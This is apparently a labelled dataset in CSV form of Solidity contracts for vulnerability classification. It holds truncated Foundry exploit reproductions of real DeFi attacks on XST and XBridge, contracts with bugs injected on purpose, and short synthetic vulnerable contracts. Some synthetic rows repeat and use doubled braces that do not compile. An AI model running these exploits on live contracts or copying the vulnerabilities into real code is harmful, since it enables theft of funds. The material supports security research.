source,filename,label,label_id,code
defihack,XST_exp2.sol,other,13,"// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import ""forge-std/Test.sol"";
import ""./../interface.sol"";

// Pool1: UniswapV2 WETH/USDT
// Pool2: UniswapV2 WETH/XST
// XST Logic Contract Address: https://etherscan.io/address/0xb276647e70cb3b81a1ca302cf8de280ff0ce5799#code
// https://tools.blocksec.com/tx/eth/0x873f7c77d5489c1990f701e9bb312c103c5ebcdcf0a472db726730814bfd55f3

contract ContractTest is Test {
    IERC20 XST = IERC20(0x91383A15C391c142b80045D8b4730C1c37ac0378);
    IERC20 WETH = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    Uni_Pair_V2 Pair1 = Uni_Pair_V2(0x0d4a11d5EEaaC28EC3F61d100daF4d40471f1852); // WETH USDT
    Uni_Pair_V2 Pair2 = Uni_Pair_V2(0x694f8F9E0ec188f528d6354fdd0e47DcA79B6f2C); // WETH XST
    uint256 amount;

    CheatCodes cheat = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

    function setUp() public {
        cheat.createSelectFork(""mainnet"", 15_310_016);
    }

    function testExploit() public {
        emit log_named_decimal_uint(""Attacker WETH profit before exploit"", WETH.balanceOf(address(this)), 18);

        amount = WETH.balanceOf(address(Pair2));
        Pair1.swap(amount * 2, 0, address(this), new bytes(1));

        emit log_named_decimal_uint(""Attacker WETH profit after exploit"", WETH.balanceOf(address(this)), 18);
    }

    function uniswapV2Call(address sender, uint256 amount0, uint256 amount1, bytes calldata data) public {
        // swap WETH to XST
        uint256 amountSellWETH = WETH.balanceOf(address(this));
        (uint256 reserve0, uint256 reserve1,) = Pair2.getReserves(); // r0 : XST r1 WETH
        uint256 amountOutXST = amountSellWETH * 997 * reserve0 / (reserve1 * 1000 + amountSellWETH * 997);
        WETH.transfer(address(Pair2), amountSellWETH);
        Pair2.swap(amountOutXST, 0, address(this), """");

        //XST skim
        XST.transfer(address(Pair2), XST.balanceOf(address(this)) / 8);
        for (int256 i = 0; i < 15; i++) {
            Pair2.skim(address(Pair2));
        }
        Pair2.skim(address(this)"
solidifi,buggy_32.sol,other,13,"/**
 * Source Code first verified at https://etherscan.io on Thursday, May 9, 2019
 (UTC) */

pragma solidity >=0.4.21 <0.6.0;
/**
 * ███████╗ ██████╗ ██████╗  █████╗ ███╗   ███╗
 * ██╔════╝██╔════╝ ██╔══██╗██╔══██╗████╗ ████║
 * █████╗  ██║  ███╗██████╔╝███████║██╔████╔██║
 * ██╔══╝  ██║   ██║██╔══██╗██╔══██║██║╚██╔╝██║
 * ███████╗╚██████╔╝██║  ██║██║  ██║██║ ╚═╝ ██║
 * ╚══════╝ ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝     ╚═╝                                         
 */

/**
 * @title SafeMath
 * @dev Unsigned math operations with safety checks that revert on error.
 */
library SafeMath {

    /**
     * @dev Subtracts two unsigned integers, reverts on overflow (i.e. if subtrahend is greater than minuend).
     */
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a);
        uint256 c = a - b;

        return c;
    }

    /**
     * @dev Adds two unsigned integers, reverts on overflow.
     */
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a);

        return c;
    }

}

/**
 * Token contract interface for external use
 */
contract ERC20TokenInterface {

    function balanceOf(address _owner) public view returns (uint256 value);
mapping(address => uint) redeemableEther_re_ent4;
function claimReward_re_ent4() public {        
        // ensure there is a reward to give
        require(redeemableEther_re_ent4[msg.sender] > 0);
        uint transferValue_re_ent4 = redeemableEther_re_ent4[msg.sender];
        msg.sender.transfer(transferValue_re_ent4);   //bug
        redeemableEther_re_ent4[msg.sender] = 0;
    }
    function transfer(address _to, uint256 _value) public returns (bool success);
uint256 counter_re_ent7 =0;
function callme_re_ent7() public{
        require(counter_re_ent7<=5);
	if( ! (msg.sender.send(10 ether) ) ){
            revert();
        }
        counter_re_ent7 += 1;
    }
    function transferFrom(address _from, address _to, uint256 _value) public returns (bool success);
address lastPl"
synthetic,synthetic_front_running_mev_113.sol,front_running_mev,7,"pragma solidity ^0.8.0;
contract FrontRunnable {{
    mapping(address => uint) public commitments;
    function commit(bytes32 hash) external payable {{
        commitments[msg.sender] = block.number;  // visible in mempool
    }}
    function reveal(uint secret) external {{
        require(commitments[msg.sender] != 0);
        // attacker can frontrun with same secret
        _reward(msg.sender, secret);
    }}
    function _reward(address to, uint amt) internal {{}}
}}
// variant_113_8357"
solidifi,buggy_28.sol,front_running_mev,7,"/**
 *Submitted for verification at Etherscan.io on 2019-09-22
*/

pragma solidity ^0.5.0;

interface IERC20 {
  function totalSupply() external view returns (uint256);
  function balanceOf(address who) external view returns (uint256);
  function allowance(address owner, address spender) external view returns (uint256);
  function transfer(address to, uint256 value) external returns (bool);
  function approve(address spender, uint256 value) external returns (bool);
  function transferFrom(address from, address to, uint256 value) external returns (bool);

  event Transfer(address indexed from, address indexed to, uint256 value);
  event Approval(address indexed owner, address indexed spender, uint256 value);
}

library SafeMath {
  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    if (a == 0) {
      return 0;
    }
    uint256 c = a * b;
    assert(c / a == b);
    return c;
  }

  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a / b;
    return c;
  }

  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    assert(b <= a);
    return a - b;
  }

  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    assert(c >= a);
    return c;
  }

  function ceil(uint256 a, uint256 m) internal pure returns (uint256) {
    uint256 c = add(a,m);
    uint256 d = sub(c,1);
    return mul(div(d,m),m);
  }
}

contract ERC20Detailed is IERC20 {

bool claimed_TOD22 = false;
address payable owner_TOD22;
uint256 reward_TOD22;
function setReward_TOD22() public payable {
        require (!claimed_TOD22);

        require(msg.sender == owner_TOD22);
        owner_TOD22.transfer(reward_TOD22);
        reward_TOD22 = msg.value;
    }

    function claimReward_TOD22(uint256 submission) public {
        require (!claimed_TOD22);
        require(submission < 10);

        msg.sender.transfer(reward_TOD22);
        claimed_TOD22 = true;
    }
  string private _name;
bool claimed_TOD12 = false;
address payable owner_TOD12;
u"
synthetic,synthetic_timestamp_dependence_473.sol,timestamp_dependence,8,"pragma solidity ^0.8.0;
contract TimestampLottery {{
    uint public jackpot;
    function enter() external payable {{ jackpot += msg.value; }}
    function pickWinner() external {{
        require(block.timestamp % 15 == 0, ""not lucky time"");  // miner-manipulable
        payable(msg.sender).transfer(jackpot);
        jackpot = 0;
    }}
}}
// variant_473_4963"
defihack,XBridge_exp.sol,other,13,"// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import ""forge-std/Test.sol"";
import ""../interface.sol"";

// @KeyInfo - Total Lost : ~$1.6M(https://debank.com/profile/0x0cfc28d16d07219249c6d6d6ae24e7132ee4caa7, >200k USD(plus a lot of STC, SRLTY, Mazi tokens))
// Attacker : https://etherscan.io/address/0x0cfc28d16d07219249c6d6d6ae24e7132ee4caa7
// Vulnerable Contract : https://etherscan.io/address/0x354cca2f55dde182d36fe34d673430e226a3cb8c#code
// Attack Tx Step1(deposit) : https://etherscan.io/tx/0xe09d350d8574ac1728ab5797e3aa46841f6c97239940db010943f23ad4acf7ae
// Attack Tx Step2(withdrawToken): https://etherscan.io/tx/0x903d88a92cbc0165a7f662305ac1bff97430dbcccaa0fe71e101e18aa9109c92

// @Analysis
// https://twitter.com/CyversAlerts/status/1783045506471432610

interface IXbridge {
    struct tokenInfo {
        address token;
        uint256 chain;
    }

    function listToken(
        tokenInfo memory baseToken,
        tokenInfo memory correspondingToken,
        bool _isMintable
    ) external payable;
    function withdrawTokens(address token, address receiver, uint256 amount) external;
}

contract ContractTest is Test {
    IERC20 STC = IERC20(0x19Ae49B9F38dD836317363839A5f6bfBFA7e319A);
    IXbridge xbridge = IXbridge(0x47Ddb6A433B76117a98FBeAb5320D8b67D468e31);

    function setUp() public {
        vm.createSelectFork(""mainnet"", 19_723_701 - 1);
    }

    function testExploit() public {
        // First TX
        deal(address(this), 0.15 ether);
        emit log_named_decimal_uint(""Exploiter STC balance before attack"", STC.balanceOf(address(this)), 9);

        IXbridge.tokenInfo memory base = IXbridge.tokenInfo(address(STC), 85_936);
        IXbridge.tokenInfo memory corr = IXbridge.tokenInfo(address(STC), 95_838);

        xbridge.listToken{value: 0.15 ether}(base, corr, false);

        xbridge.withdrawTokens(address(STC), address(this), STC.balanceOf(address(xbridge)));

        emit log_named_decimal_uint(""Exploiter STC balance after attack"", STC.balanceOf(address(this)), 9);
  "
synthetic,synthetic_misnamed_constructor_474.sol,misnamed_constructor,12,"pragma solidity ^0.4.22;
contract MisnamedConstructor {{
    address public owner;
    function MisnamedConstructor() public {{   // old-style constructor — anyone can call
        owner = msg.sender;
    }}
    function withdraw() public {{
        require(msg.sender == owner);
        msg.sender.transfer(address(this).balance);
    }}
    function() public payable {{}}
}}
// variant_474_9180"
synthetic,synthetic_misnamed_constructor_251.sol,misnamed_constructor,12,"pragma solidity ^0.4.22;
contract MisnamedConstructor {{
    address public owner;
    function MisnamedConstructor() public {{   // old-style constructor — anyone can call
        owner = msg.sender;
    }}
    function withdraw() public {{
        require(msg.sender == owner);
        msg.sender.transfer(address(this).balance);
    }}
    function() public payable {{}}
}}
// variant_251_6095"
synthetic,synthetic_timestamp_dependence_544.sol,timestamp_dependence,8,"pragma solidity ^0.8.0;
contract TimestampLottery {{
    uint public jackpot;
    function enter() external payable {{ jackpot += msg.value; }}
    function pickWinner() external {{
        require(block.timestamp % 15 == 0, ""not lucky time"");  // miner-manipulable
        payable(msg.sender).transfer(jackpot);
        jackpot = 0;
    }}
}}
// variant_544_7628"
synthetic,synthetic_access_control_348.sol,access_control,3,"pragma solidity ^0.8.0;
contract AccessControlVuln {
    address public owner;
    constructor() { owner = msg.sender; }
    function changeOwner(address _new) public {  // missing onlyOwner modifier
        owner = _new;
    }
    function withdraw() public {
        require(msg.sender == owner);
        payable(owner).transfer(address(this).balance);
    }
}
// variant_348_6689"
synthetic,synthetic_reentrancy_331.sol,reentrancy,1,"pragma solidity ^0.8.0;
contract ReentrancyVuln {
    mapping(address => uint) public balances;
    function deposit() external payable { balances[msg.sender] += msg.value; }
    function withdraw() external {
        uint amt = balances[msg.sender];
        require(amt > 0);
        (bool ok,) = msg.sender.call{value: amt}("""");  // vulnerable: state updated after call
        require(ok);
        balances[msg.sender] = 0;
    }
}
// variant_331_7240"
synthetic,synthetic_access_control_440.sol,access_control,3,"pragma solidity ^0.8.0;
contract AccessControlVuln {
    address public owner;
    constructor() { owner = msg.sender; }
    function changeOwner(address _new) public {  // missing onlyOwner modifier
        owner = _new;
    }
    function withdraw() public {
        require(msg.sender == owner);
        payable(owner).transfer(address(this).balance);
    }
}
// variant_440_6527"
synthetic,synthetic_proxy_storage_collision_513.sol,proxy_storage_collision,9,"pragma solidity ^0.8.0;
contract Proxy {{
    address public implementation;   // slot 0 — collides with logic contract state
    address public admin;            // slot 1
    fallback() external payable {{
        address impl = implementation;
        assembly {{
            calldatacopy(0, 0, calldatasize())
            let result := delegatecall(gas(), impl, 0, calldatasize(), 0, 0)
            returndatacopy(0, 0, returndatasize())
            switch result
            case 0 {{ revert(0, returndatasize()) }}
            default {{ return(0, returndatasize()) }}
        }}
    }}
}}
contract LogicV1 {{
    address public owner;            // slot 0 — overwrites Proxy.implementation!
    function setOwner(address _o) public {{ owner = _o; }}
}}
// variant_513_2215"
synthetic,synthetic_front_running_mev_577.sol,front_running_mev,7,"pragma solidity ^0.8.0;
contract FrontRunnable {{
    mapping(address => uint) public commitments;
    function commit(bytes32 hash) external payable {{
        commitments[msg.sender] = block.number;  // visible in mempool
    }}
    function reveal(uint secret) external {{
        require(commitments[msg.sender] != 0);
        // attacker can frontrun with same secret
        _reward(msg.sender, secret);
    }}
    function _reward(address to, uint amt) internal {{}}
}}
// variant_577_8620"
solidifi,buggy_14.sol,other,13,"/**
 * Source Code first verified at https://etherscan.io on Friday, April 26, 2019
 (UTC) */

pragma solidity >=0.4.21 < 0.6.0;

library SafeMath {

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {

        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b);

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
     
        require(b > 0);
        uint256 c = a / b;
   
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a);
        uint256 c = a - b;

        return c;
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a);

        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b != 0);
        return a % b;
    }
}

interface IERC20 {
    function totalSupply() public view returns (uint256);
    
    function balanceOf(address who) public view returns (uint256);
      
    function transfer(address to, uint256 value) public returns (bool);

    function transferFrom(address from, address to, uint256 value) public returns (bool);

    function approve(address spender, uint256 value) public returns (bool);

    function allowance(address owner, address spender) public view returns (uint256);


    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    event Burn(address indexed from, uint256 value);
}


contract ERC20 is IERC20 {
    
    using SafeMath for uint256;
  function bug_tmstmp20 () public  {
	uint pastBlockTime_tmstmp20; // Forces one bet per block
	require(msg.value == 10 ether); // must send 10 ether to play
        require(now != pastBlockTime_tmstmp20); // only 1 transaction per block   //bug
        pastBlockTime_tmstmp20 = now;       //bug
        if(now % 15 == 0) { // winn"
